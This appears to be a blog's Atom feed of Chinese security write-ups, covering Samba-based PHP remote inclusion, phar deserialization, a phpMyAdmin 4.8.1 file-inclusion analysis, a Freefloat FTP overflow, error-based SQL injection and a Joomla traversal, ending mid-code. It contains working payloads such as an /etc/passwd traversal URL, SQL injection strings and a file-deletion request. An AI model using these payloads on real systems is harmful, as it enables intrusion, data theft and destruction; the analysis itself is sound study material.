@@ -1,0 +1,519 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Even-Want</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2018-11-25T12:55:02.000Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>Even-Want</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://yoursite.com/2019/05/22/test/"/>
+    <id>http://yoursite.com/2019/05/22/test/</id>
+    <published>2019-05-22T13:06:02.217Z</published>
+    <updated>2018-11-25T12:55:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>ccc_liubi</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;ccc_liubi&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>使用samba绕过allow_url_include限制</title>
+    <link href="http://yoursite.com/2019/05/15/%E4%BD%BF%E7%94%A8samba%E7%BB%95%E8%BF%87allow-url-include%E9%99%90%E5%88%B6/"/>
+    <id>http://yoursite.com/2019/05/15/使用samba绕过allow-url-include限制/</id>
+    <published>2019-05-15T09:37:31.000Z</published>
+    <updated>2019-05-15T09:39:36.963Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前不久在知识星球看到了好玩的东西，能够在<code>allow_url_include</code>参数为<code>off</code>的情况下，远程包含文件。所利用的是samba服务，今天就来自己复现一下。</p><h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><h3 id="samba服务器搭建"><a href="#samba服务器搭建" class="headerlink" title="samba服务器搭建"></a>samba服务器搭建</h3><ol><li><p>这里我使用的是ubuntu，直接可以使用命令进行安装。<br> <code>sudo apt-get install samba</code></p></li><li><p>需要创建一个目录作为smb服务的目录。<br> <code>sudo mkdir /var/www/html/test/</code></p></li><li><p>修改对应目录的权限<br><code>sudo chmod 0555 /var/www/html/test/</code></p></li><li><p>更改smb服务的配置文件<br> 对应的配置文件为<code>/etc/samba/smb.conf</code>，在其中添加以下内容</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = indishell-lab</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line">[even_want]</span><br><span class="line">path = /var/www/html/test</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line">read only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure><ol start="5"><li>重启smb服务<br> <code>sudo service smbd restart</code></li></ol><p>然后我们就能使用对应ip去访问这个共享的目录。<br><img src="/2019/05/15/使用samba绕过allow-url-include限制/1.png" alt="1"></p><h3 id="远程包含文件"><a href="#远程包含文件" class="headerlink" title="远程包含文件"></a>远程包含文件</h3><p>实验的时候要先确保将<code>allow_url_include</code>参数值修改为<code>off</code>。<br>然后创建一个简单的demo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include $_GET[&apos;a&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>接着在实验机中的test目录下放入phpinfo文件，包含该文件。<br><img src="/2019/05/15/使用samba绕过allow-url-include限制/2.png" alt="2"><br>能看到确实已经远程包含了phpinfo文件。<br>同理，<code>require</code>等函数也可以这样利用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个虽然看上去挺厉害的， 但是实际上，smb因为之前的漏洞，对应的端口已经被封光了，很难应用到实际中。但是其他的像<code>webdav</code>这种同理也是可以被包含，利用的价值更大。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前不久在知识星球看到了好玩的东西，能够在&lt;code&gt;allow_url_include&lt;/code&gt;参数为&lt;code&gt;off&lt;/code&gt;的
+      
+    
+    </summary>
+    
+    
+      <category term="php,samba,RFI" scheme="http://yoursite.com/tags/php-samba-RFI/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>phar 反序列化复习</title>
+    <link href="http://yoursite.com/2019/05/10/phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E4%B9%A0/"/>
+    <id>http://yoursite.com/2019/05/10/phar-反序列化复习/</id>
+    <published>2019-05-10T06:36:21.000Z</published>
+    <updated>2019-05-10T06:40:40.830Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  web方面好久都没关注了，好多知识都忘得差不多了，从今天开始，慢慢巩固起来。</p><p>  phar这个漏洞是在2018年的BlackHat会议上公布的。能够在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。</p><h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><ul><li>stub(标志位)<br> 格式形如<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，必须要以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</li><li>mainfest<br>该位置用于存放压缩文件的权限、属性等信息，以及序列化之后的用户自定义的meta-data，这也是攻击核心处。</li><li>contents(压缩文件内容)</li><li>signature(签名)</li></ul><h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><p>  大多数PHP文件操作允许使用各种URL协议去访问文件路径，比如php://、data:// 。但是phar://这个协议之前却都没有人关注过。phar文件与其他文件不同之处在于，它的文件内容中包含序列化的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class even_want</span><br><span class="line">&#123;</span><br><span class="line">var $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&apos;poc.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&apos;test.txt&apos;, &apos;text&apos;);</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ? &gt;&apos;);</span><br><span class="line">class AnyClass &#123;&#125;</span><br><span class="line">$object = new even_want;</span><br><span class="line">$object-&gt;s = &apos;hack&apos;;</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>使用上面的代码生成相应的phar文件之后，使用十六进制查看器查看对应内容。<br>==注意：执行这段php代码的时候，需要将php.ini中的phar.readonly选项设置为Off，否则php会报错。==<br><img src="/2019/05/10/phar-反序列化复习/1.png" alt="1"><br>能够看到文件数据中确实有着序列化数据。</p><p>通过phar://协议来读取现有的phar文件，那么文件中存储的序列化数据就会被反序列化，而如果此时程序存在已经定义的类，并且类中存在类似于destruct、wakeup等魔术方法，就会自动调用这些函数。</p><h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><p><code>test1.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class even_want</span><br><span class="line">&#123;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo $this-&gt;s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    $filename = &apos;phar://poc.phar/test.txt&apos;;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/10/phar-反序列化复习/2.png" alt="2"></p><p>而且从之前的phar文件结构能发现，php识别phar文件需要stub这个标志，而对文件头或者后缀名没有要求，所以我们可以在其基础上添加文件头，并修改其后缀，来进行相应的绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class even_want</span><br><span class="line">&#123;</span><br><span class="line">var $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&apos;poc.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&apos;test.txt&apos;, &apos;text&apos;);</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ? &gt;&quot;);</span><br><span class="line">class AnyClass &#123;&#125;</span><br><span class="line">$object = new even_want;</span><br><span class="line">$object-&gt;s = &apos;hack&apos;;</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p><img src="/2019/05/10/phar-反序列化复习/4.png" alt="4"><br>可以看到最后生成的phar文件已经被识别为gif文件。</p><p>具体受影响的函数：<br><img src="/2019/05/10/phar-反序列化复习/3.png" alt="3"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;  web方面好久都没关注了，好多知识都忘得差不多了，从今天开始，慢慢巩固起来。&lt;/p&gt;
+&lt;p&gt;  phar这个漏洞是在2018年的Blac
+      
+    
+    </summary>
+    
+    
+      <category term="php,反序列化" scheme="http://yoursite.com/tags/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>phpmyadmin 4.8.1 远程文件包含漏洞分析</title>
+    <link href="http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/</id>
+    <published>2019-05-06T07:16:02.000Z</published>
+    <updated>2019-05-06T07:17:07.183Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>==phpMyAdmin 4.8.0和4.8.1==</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p><code>index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>在phpmyadmin中执行<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code>语句，并记录cookie中phpMyAdmin对应的值。</li><li>包含对应生成的sess文件。</li></ol><p><img src="/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/1.png" alt="1"><br><img src="/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/2.png" alt="2"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞代码位于index.php50-63行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = array (</span><br><span class="line">    &apos;import.php&apos;, &apos;export.php&apos;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// If we have a valid target, let&apos;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! preg_match(&apos;/^index/&apos;, $_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&apos;target&apos;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&apos;target&apos;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&apos;target&apos;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中能看到，想要进入这个分支，需要满足以下5个条件：</p><ol><li><code>target</code>参数不能为空。</li><li><code>target</code>参数的值类型为字符串。</li><li><code>target</code>参数不能以index开头。</li><li><code>target</code>参数的值不能在<code>target_blacklist</code>数组的黑名单中。</li><li>作为参数传入<code>checkPageValidity</code>函数中，并返回true。</li></ol><p>其中前四个条件容易满足，现在需要关注<code>checkPageValidity</code>这个函数。<br>代码位于\libraries\classes\Core.php443-476行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist = [])</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($whitelist)) &#123;</span><br><span class="line">        $whitelist = self::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通读函数能看出，要函数返回true需要满足传入的参数值在<code>$whitelist</code>这个数组之中。<br>这里利用的是在最后一次判断白名单时，465行<code>$_page = urldecode($page);</code>将<code>$_page</code>的值进行了URL解码，接着再进行查找第一个<code>?</code>所在位置，并截取之前的字符判断是否存在于白名单中。<br>也就是说如果我们传入<code>db_sql.php%3f</code>这样的字符就能够改变第一个<code>?</code>所在的位置，从而控制<code>$_page</code>的值,绕过白名单的检查，使得函数返回为true。</p><p>==<strong>注意</strong>==<br>在进行文件包含的时候，php会认为<code>db_sql.php%3f</code>为一个目录，所以需要多使用一个../来穿越这个目录。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;==phpMyAdmin 4.8.0和4.8.1==&lt;/p&gt;
+&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; c
+      
+    
+    </summary>
+    
+    
+      <category term="php,RFI" scheme="http://yoursite.com/tags/php-RFI/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Freefloat FTP Server Remote Buffer Overflow</title>
+    <link href="http://yoursite.com/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/"/>
+    <id>http://yoursite.com/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/</id>
+    <published>2019-05-05T06:10:24.000Z</published>
+    <updated>2019-05-05T06:19:16.680Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>修改payload为500长度的<code>A</code>，查看栈回溯<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/1.png" alt="1"><br>锁定<code>00401dfe</code>这个地址，使用ida查看<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/2.png" alt="2"><br>能够看到程序使用了<code>recv</code>函数来接收数据，其中<code>edx</code>所指向的地址就是存放数据的缓冲区。从payload来看，我们传入的恶意参数在第三次传输过程中。因此我们在windbg中需要执行三次<code>g</code>命令才能到达所在位置，确定缓冲区所在的地址。<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/3.png" alt="3"><br>能够看到此时栈上的第二个地址就是缓冲区所在的地址，也就是<code>recv</code>函数的第二个参数。接着单步步过，查看此时缓冲区的值。<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/4.png" alt="4"><br>能看到我们传入的恶意数据已经进入了缓冲区，并且能看到此时是对应的<code>SIZE</code>参数，也就是说程序是在接收SIZE参数时出现了缓冲区溢出的问题。</p><h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>紧接着上面的步骤，继续单步调试。<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/5.png" alt="5"><br>在<code>00403065</code>处，程序调用了<code>sub_4020e0</code>函数，之后地址变为了<code>41414141</code>，跟入函数，继续单步。<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/6.png" alt="6"><br>相同的情况发生在<code>0040213a</code>处，程序调用的是<code>sub_402190</code>函数，继续跟入。<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/7.png" alt="7"><br><code>004028ed</code>之后，程序出错。<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/8.png" alt="8"><br>能够看到，在<code>sub_402de0</code>函数结束返回的时候，程序出现了错误。<br>查看此时栈上的值，发现此时已经布满了我们输入的数据。<br><img src="/2019/05/05/Freefloat-FTP-Server-Remote-Buffer-Overflow/9.png" alt="9"><br>说明漏洞的触发点是在<code>402ebb</code>这个地址，也就是<code>sub_402de0</code>函数返回处。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;h3 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a
+      
+    
+    </summary>
+    
+    
+      <category term="remote,BOF" scheme="http://yoursite.com/tags/remote-BOF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL注入之基于运行错误</title>
+    <link href="http://yoursite.com/2019/04/29/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9F%BA%E4%BA%8E%E8%BF%90%E8%A1%8C%E9%94%99%E8%AF%AF/"/>
+    <id>http://yoursite.com/2019/04/29/SQL注入之基于运行错误/</id>
+    <published>2019-04-29T07:36:36.000Z</published>
+    <updated>2019-04-29T07:40:33.580Z</updated>
+    
+    <content type="html"><![CDATA[<p>常见使用的报错注入函数</p><ul><li>updatexml()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><ul><li>floor()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;</span><br></pre></td></tr></table></figure><ul><li>exp()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from (select user())a));</span><br></pre></td></tr></table></figure><p>但是如果程序并不会输出错误信息，而是仅提示存在错误呢，能不能使用上面的函数进行报错盲注呢</p><h2 id="Exp报错盲注"><a href="#Exp报错盲注" class="headerlink" title="Exp报错盲注"></a>Exp报错盲注</h2><p>实际上使用exp函数时，如果参数超过了709，mysql都会报错。<br><img src="/2019/04/29/SQL注入之基于运行错误/1.PNG" alt="1"><br>因此，可以使用单个字符之间的加减来改变exp参数的值来达到错误盲注的效果。<br><img src="/2019/04/29/SQL注入之基于运行错误/2.PNG" alt="2"><br>因为<code>&#39;r&#39;-&#39;s&#39;+709=710</code>，使得exp函数运行报错，导致页面可能发生变化，而<code>&#39;r&#39;-&#39;r&#39;+709=709</code>，在正常范围之内，所以页面则会返回正常数据，盲注的效果也就出来了。</p><h2 id="Floor报错盲注"><a href="#Floor报错盲注" class="headerlink" title="Floor报错盲注"></a>Floor报错盲注</h2><p>floor报错注入时，group by是很重要的一环，如果后面跟着的参数为对应floor函数的返回值，那么就会报错，而如果使用其他的值，就能够返回正常值。<br><img src="/2019/04/29/SQL注入之基于运行错误/3.PNG" alt="3"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li>Exp报错注入存在版本限制，相应的测试我是在5.5.47版本中进行的，如果继续往上，那么很可能出现如下的错误信息，但是报错盲注的方法还是可以使用的。<br><img src="/2019/04/29/SQL注入之基于运行错误/4.PNG" alt="4"></li><li><p>Floor报错注入对查询的数据数量有要求，不能太少，否则是不会产生错误信息的。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/4914" target="_blank" rel="noopener">https://xz.aliyun.com/t/4914</a></p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;常见使用的报错注入函数&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;updatexml()&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/
+      
+    
+    </summary>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Joomla Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion分析</title>
+    <link href="http://yoursite.com/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion%E5%88%86%E6%9E%90/"/>
+    <id>http://yoursite.com/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/</id>
+    <published>2019-04-29T05:39:13.000Z</published>
+    <updated>2019-04-29T05:44:09.415Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li>目录遍历<br><code>?option=com_media&amp;view=mediaList&amp;tmpl=component&amp;folder=/..</code></li></ul><p><img src="/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/1.PNG" alt="1"></p><ul><li><p>任意文件删除<br><code>?option=com_media&amp;task=folder.delete&amp;tmpl=index&amp;folder=%2F..&amp;rm[]={要删除的文件}</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2></li></ul><h3 id="目录遍历分析"><a href="#目录遍历分析" class="headerlink" title="目录遍历分析"></a>目录遍历分析</h3><p>/administrator/components/com_media/controller.php代码50行处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function display($cachable = false, $urlparams = false)</span><br><span class="line">&#123;</span><br><span class="line">JPluginHelper::importPlugin(&apos;content&apos;);</span><br><span class="line">$vType    = JFactory::getDocument()-&gt;getType();</span><br><span class="line">$vName    = $this-&gt;input-&gt;get(&apos;view&apos;, &apos;media&apos;);</span><br><span class="line">switch ($vName)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">case &apos;mediaList&apos;:</span><br><span class="line">$app     = JFactory::getApplication();</span><br><span class="line">$mName   = &apos;list&apos;;</span><br><span class="line">$vLayout = $app-&gt;getUserStateFromRequest(&apos;media.list.layout&apos;, &apos;layout&apos;, &apos;thumbs&apos;, &apos;word&apos;);</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>能看到程序根据接收到的<code>view</code>参数会进入到<code>mediaList</code>处理中。<br>而之后的80行中，程序会调用<code>$view-&gt;display();</code>来进行页面的展示。跟入此函数中。</p><p>/administrator/components/com_media/views/medialist/view.html.php代码28-44行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function display($tpl = null)</span><br><span class="line">&#123;</span><br><span class="line">$app = JFactory::getApplication();</span><br><span class="line">if (!$app-&gt;isClient(&apos;administrator&apos;))</span><br><span class="line">&#123;</span><br><span class="line">return $app-&gt;enqueueMessage(JText::_(&apos;JERROR_ALERTNOAUTHOR&apos;), &apos;warning&apos;);</span><br><span class="line">&#125;</span><br><span class="line">// Do not allow cache</span><br><span class="line">$app-&gt;allowCache(false);</span><br><span class="line">$this-&gt;images    = $this-&gt;get(&apos;images&apos;);</span><br><span class="line">$this-&gt;documents = $this-&gt;get(&apos;documents&apos;);</span><br><span class="line">$this-&gt;folders   = $this-&gt;get(&apos;folders&apos;);</span><br><span class="line">$this-&gt;videos    = $this-&gt;get(&apos;videos&apos;);</span><br><span class="line">$this-&gt;state     = $this-&gt;get(&apos;state&apos;);</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>能够看到程序会使用<code>$this-&gt;get(&#39;folders&#39;)</code>这种形式来获取对应参数的值，继续跟入get函数。</p><p>/libraies/src/MVC/View/HtmlView.php代码403-429行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 